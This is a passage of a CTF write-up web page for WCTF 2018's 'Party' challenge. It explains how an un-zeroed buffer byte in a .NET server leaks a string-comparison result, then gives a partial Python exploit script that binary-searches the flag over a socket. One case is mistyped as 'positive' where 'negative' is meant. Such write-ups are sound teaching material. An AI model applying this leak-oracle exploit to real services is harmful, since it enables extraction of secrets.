<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Party - WCTF 2018 &#183; mhackeroni</title><meta name=title content="Party - WCTF 2018 &#183; mhackeroni"><meta name=description content="Write-up for the Party challenge from WCTF 2018."><meta name=keywords content="wctf,ctf,.net,scripting,mhackeroni,"><link rel=canonical href=https://mhackeroni.it/writeups/2018-07-08-wctf-2018-party/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2018-07-08-wctf-2018-party/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="Party - WCTF 2018"><meta property="og:description" content="Write-up for the Party challenge from WCTF 2018."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-07-08T00:00:00+00:00"><meta property="article:modified_time" content="2018-07-08T00:00:00+00:00"><meta property="article:tag" content="Wctf"><meta property="article:tag" content="Ctf"><meta property="article:tag" content=".Net"><meta property="article:tag" content="Scripting"><meta property="article:tag" content="Mhackeroni"><meta name=twitter:card content="summary"><meta name=twitter:title content="Party - WCTF 2018"><meta name=twitter:description content="Write-up for the Party challenge from WCTF 2018."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"Party - WCTF 2018","headline":"Party - WCTF 2018","description":"Write-up for the Party challenge from WCTF 2018.","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2018-07-08-wctf-2018-party\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2018","dateCreated":"2018-07-08T00:00:00\u002b00:00","datePublished":"2018-07-08T00:00:00\u002b00:00","dateModified":"2018-07-08T00:00:00\u002b00:00","keywords":["wctf","ctf",".net","scripting","mhackeroni"],"mainEntityOfPage":"true","wordCount":"1498"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="ðŸ“·  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="ðŸ“·  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Party - WCTF 2018</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2018-07-08T00:00:00+00:00>8 July 2018</time><span class="px-2 text-primary-500">&#183;</span><span>1498 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">8 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><div class="lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl">Authors: pietroferretti</div><blockquote><p>Give them an inch and they&rsquo;ll take a mile</p></blockquote><h2 class="relative group">First look<div id=first-look class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#first-look aria-label=Anchor>#</a></span></h2><p>The challenge is a small .NET PE binary.</p><p>Running the executable we can see that it can be run:</p><ul><li>as a server, which holds a secret flag;</li><li>as a client, which sends messages to the server via socket and shows the replies in a dialog.</li></ul><p>The server interface:</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=server srcset="/img/party_writeup/server_hu_98184d56000f9663.png 330w,
/img/party_writeup/server_hu_c8980fff053fbec2.png 660w,
/img/party_writeup/server_hu_b3f4a6e46b1638e3.png 1280w" data-zoom-src=/img/party_writeup/server.png src=/img/party_writeup/server.png></figure></p><p>The client interface:</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=client srcset="/img/party_writeup/client_hu_b56c83d17144e01f.png 330w,
/img/party_writeup/client_hu_bd66ab308ee4d920.png 660w,
/img/party_writeup/client_hu_f8f32291f7ce5d06.png 1280w" data-zoom-src=/img/party_writeup/client.png src=/img/party_writeup/client.png></figure></p><p>The user interface lets you define a list of &ldquo;party guests&rdquo;, a list of &ldquo;friendships&rdquo; between them, and some &ldquo;Erdos Scrutiny&rdquo; parameter.
By clicking on &ldquo;Evaluate Party&rdquo; the parameters are sent to the server and evaluated according to some unknown criteria.
The server replies saying if Paul Erdos either approves or disapproves of the party.</p><p>Since there isn&rsquo;t any obvious way to interact with the flag from the client, we&rsquo;d better look at the insides of the program.</p><h2 class="relative group">Reversing the binary<div id=reversing-the-binary class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#reversing-the-binary aria-label=Anchor>#</a></span></h2><p>We decompiled the binary to better understand how the client communicates with the server.</p><p>Here is the decompiled source: <a href=/code/party_writeup/ClientThread.cs><code>ClientThread.cs</code></a>.</p><p>We found out that there are actually three different type of messages which the server accepts, depending on the first number sent to the socket:</p><ul><li>1: a simple echo service</li><li>2: the &ldquo;Erdos party approval&rdquo; check that is actually used by the user interface</li><li>3: a flag check service</li></ul><h3 class="relative group">The flag check service<div id=the-flag-check-service class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-flag-check-service aria-label=Anchor>#</a></span></h3><p>This service takes a number of strings, one per line, and for each checks if the string is equal to the flag.
The service then replies with &ldquo;Correct&rdquo; or &ldquo;Incorrect&rdquo; for each of the strings supplied.</p><p>As it is, this service is not very useful for us. Since the check is made on the whole flag, the only way we have to find the flag would be to fully bruteforce it, which is unfeasible.</p><p>Looking at the code though we can see that this is the <strong>only</strong> section of code where the flag is used. We are therefore forced to find some way to make use of it, or somehow leak the information elsewhere.</p><p>After looking at the code some more, we noticed that the <code>comm</code> buffer is used by both the flag check service and the erdos approval service.
There might exist some way for some information related to the flag to leak from the other service, as long as:</p><ul><li>the <code>comm</code> buffer is modified in a way that depends on the flag,</li><li>the buffer is not cleared out when the approval service is used,</li><li>the output of the approval service depends on the portion of content of <code>comm</code> that was modified by the flag check service.</li></ul><p>The flag check is computed with the following code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>res</span> <span class=o>=</span> <span class=n>string</span><span class=p>.</span><span class=nf>Compare</span><span class=p>(</span><span class=n>this</span><span class=p>.</span><span class=n>flag</span><span class=p>,</span> <span class=n>strB</span><span class=p>,</span> <span class=n>StringComparison</span><span class=p>.</span><span class=n>Ordinal</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// res is then saved into comm
</span></span></span></code></pre></div><p>We can see that the result of <code>string.Compare</code> (a 4-byte integer) is stored in <code>comm</code>, and therefore the first condition is satisfied.</p><p>Note: the result of the call is positive or negative depending on which of the two arguments would come first in the lexicographic order.
This means that if we manage to leak the content of <code>comm</code>, we could setup a binary search using the result of the <code>Compare</code> as a discriminator, and find the flag byte by byte.</p><h3 class="relative group">The Erdos approval service<div id=the-erdos-approval-service class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-erdos-approval-service aria-label=Anchor>#</a></span></h3><p>Long story short, this service does the following:</p><ul><li>Given <code>n</code> a number of nodes, <code>l</code> edges, <code>s</code> threshold,</li><li>build an undirected graph with <code>n</code> nodes and the <code>l</code> edges provided,</li><li>check if<ul><li>there are no fully connected subgraphs with more than or equal to <code>s</code> nodes</li><li>there are no fully disconnected subgraphs with more than or equal to <code>s</code> nodes</li></ul></li></ul><p>In this section of the program <code>comm</code> is used to store the edges of the graph, represented as single bits: 1 if the edge exists, 0 if it doesn&rsquo;t.</p><p>The following lines of codes are the ones supposed to zero out all the bytes needed to store the edges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>maxedgesbytes</span> <span class=o>=</span> <span class=p>(</span><span class=n>nodes</span> <span class=o>*</span> <span class=n>nodes</span> <span class=o>-</span> <span class=n>nodes</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>index</span> <span class=o>&lt;</span> <span class=n>maxedgesbytes</span><span class=p>;</span> <span class=o>++</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>this</span><span class=p>.</span><span class=n>comm</span><span class=p>[</span><span class=mi>2</span> <span class=o>+</span> <span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span><span class=p>)</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></div><p>The code makes sense (each node can have an edge with <code>nodes - 1</code> other nodes, the total number is divided by 2 since the graph is undirected),
but it&rsquo;s actually flawed: the division by 8 truncates the result, and prevents the last needed byte from being zeroed out.</p><p>This means any previous usage of <code>comm</code> can affect the representation of the graph edges, or, in other words, the content of <code>comm</code> can &ldquo;add edges&rdquo; to the graph.
For instance if some bits in that last byte were left to 1 from previous usages, the code would believe that the edges corresponding to those bits exist in the graph.</p><p>The immediate consequence is that the result of the erdos approval computation can also change depending from previous usages of <code>comm</code>.</p><p>This takes care of the second and third conditions we laid out previously, and prove that an attack is possible.</p><p>We now need to find some reliable way to guess the content of that leftover byte using the erdos approval check.</p><h2 class="relative group">The attack<div id=the-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-attack aria-label=Anchor>#</a></span></h2><p>We&rsquo;re interested in the sign of the <code>string.Compare</code> result, i.e. if the integer was positive or negative.</p><p>The integer is stored in <code>comm</code> as 4 bytes, in little-endian order, and, being signed, it probably uses the <a href=https://en.wikipedia.org/wiki/Two%27s_complement target=_blank>two&rsquo;s complement</a> representation.</p><p>With some tests we noticed that the absolute value of the result of <code>string.Compare</code> doesn&rsquo;t go over 2 bytes.
This mean that, using two&rsquo;s complement:</p><ul><li>if the result is positive, the most significant byte is all zeros</li><li>if the result is negative, the most significant byte is all ones</li></ul><p>Since the integer is saved in litte-endian order, the most significant byte is the 4th.</p><p>The 4th byte can only assume two different values, and the erdos approval too: with the correct setup, there might be a way to reliably recover the sign of the result from a single erdos approval check.</p><p>Looking back at the <code>comm</code> zeroing out snippet:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>maxedgesbytes</span> <span class=o>=</span> <span class=p>(</span><span class=n>nodes</span> <span class=o>*</span> <span class=n>nodes</span> <span class=o>-</span> <span class=n>nodes</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>index</span> <span class=o>&lt;</span> <span class=n>maxedgesbytes</span><span class=p>;</span> <span class=o>++</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>this</span><span class=p>.</span><span class=n>comm</span><span class=p>[</span><span class=mi>2</span> <span class=o>+</span> <span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span><span class=p>)</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></div><p>We want <code>maxedgesbytes</code> to reach the 4th byte, but not overwrite it.
To achieve this we want to choose the number of nodes such that:
<code>((nodes * nodes - nodes) / 2 / 8) % 4 == 3 - 2</code></p><p>(NB: <code>- 2</code> because <code>comm</code> is zeroed out starting from 2, but the compare results are stored starting from 0)</p><p>One of the values that fulfill this condition is 6 (among many others).</p><p>In the case of 6, the number of possible edges is <code>(6*6 - 6) / 2 = 15</code>.
The number of zeroed out bytes is <code>2 + (15/8) = 3</code>, leaving the 4th byte untouched but still used to represent the graph (we need two bytes to store 15 edges).</p><p>Consider this case:</p><ul><li><code>n</code> = 6 nodes</li><li><code>l</code> = 0 edges</li><li>threshold <code>s</code> = 6</li></ul><p>Depending on the result of the <code>string.Compare</code> call:</p><ul><li>if the result is positive, the 4th byte is all zeros<ul><li>no edges, we have a fully disconnected subgraph of size 6. Not approved.</li></ul></li><li>if the result is positive, the 4th byte is all ones<ul><li>some edges exist,there is no fully disconnected or fully connected subgraph of size 6. Approved.</li></ul></li></ul><p>We can therefore find the value of the 4th byte and the sign of the comparison with the flag.</p><p>We have everything we need.
We can now setup a binary search by adding a character at a time to our input and checking if the result of the compare is positive or negative.</p><p>The exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>socket</span> <span class=kn>import</span> <span class=n>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;180.163.241.15&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>10658</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>testflag</span><span class=p>(</span><span class=n>flag</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># overwrite comm</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># one line</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>flag</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Correct&#39;</span> <span class=ow>in</span> <span class=n>res</span> <span class=ow>or</span> <span class=sa>b</span><span class=s1>&#39;Incorrect&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;Correct&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=c1># leak sign bit</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;6</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># 6 nodes</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;6</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># threshold = 6</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;0</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># no edges</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=sa>b</span><span class=s1>&#39;party&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;does not approve&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>  <span class=c1># flag is bigger</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=sa>b</span><span class=s1>&#39;approves&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span>  <span class=c1># flag is smaller</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>newchar</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=n>newchar</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minv</span> <span class=o>=</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>maxv</span> <span class=o>=</span> <span class=mh>0x7e</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>minv</span> <span class=o>!=</span> <span class=n>maxv</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>newchar</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>minv</span> <span class=o>+</span> <span class=p>(</span><span class=n>maxv</span> <span class=o>-</span> <span class=n>minv</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>newflag</span> <span class=o>=</span> <span class=n>flag</span> <span class=o>+</span> <span class=n>newchar</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>minv</span><span class=p>,</span> <span class=n>maxv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>testflag</span><span class=p>(</span><span class=n>newflag</span><span class=p>)</span>
